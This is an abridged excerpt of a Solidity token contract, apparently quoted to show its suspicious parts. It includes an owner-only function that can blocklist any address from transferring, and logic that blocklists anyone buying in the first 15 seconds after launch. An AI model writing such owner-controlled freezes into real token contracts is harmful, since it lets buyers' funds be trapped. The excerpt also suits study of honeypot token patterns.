...
contract token is Context, IERC20, Ownable {
    ...
    address public ownerAddres = address(0x642760b1b20dfd57fE573E0bb6EFc74A4fEDf852);
    address public devAddress = address(0x758045104Bfee5065abF383Adb3c47d39EF59754);
    ...
    function setRobatAddress(address account,bool _bool) public onlyOwner{
        _blockAddress[account] = _bool;
    }
    ...
    function _transfer(
        ...
        require(!_blockAddress[from] && !_blockAddress[to],"is robat");
        if(from != ownerAddres && to != ownerAddres) {
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
            if (startTime.add(15) > block.timestamp && from == uniswapV2Pair) {
                _blockAddress[to] = true;
            }
        }
        
        if(startTime == 0 && from == ownerAddres && to == uniswapV2Pair) {
